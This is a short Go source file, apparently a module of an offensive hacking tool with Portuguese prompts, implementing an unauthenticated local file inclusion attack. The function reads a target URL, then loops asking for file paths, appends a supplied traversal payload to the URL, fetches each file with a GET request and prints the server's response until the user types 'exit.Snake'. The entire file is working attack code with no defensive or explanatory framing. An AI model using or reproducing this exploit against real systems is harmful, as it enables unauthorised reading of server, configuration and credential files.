package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

//UnauthenticatedLFI ...
func UnauthenticatedLFI(payload string) {
	var url, file string

	fmt.Printf("Url: ")
	fmt.Scanf("%s", &url)

	client := &http.Client{}
	for true {
		fmt.Printf("Arquivo: ")
		fmt.Scanf("%s", &file)
		if file == "exit.Snake" {
			break
		}
		finalURL := url + payload + file
		req, _ := http.NewRequest("GET", finalURL, nil)
		resp, _ := client.Do(req)
		body, _ := ioutil.ReadAll(resp.Body)
		result := string(body)
		fmt.Println(result)
		fmt.Printf("\nDigite 'exit.Snake' para sair do modulo\n\n")
	}
}
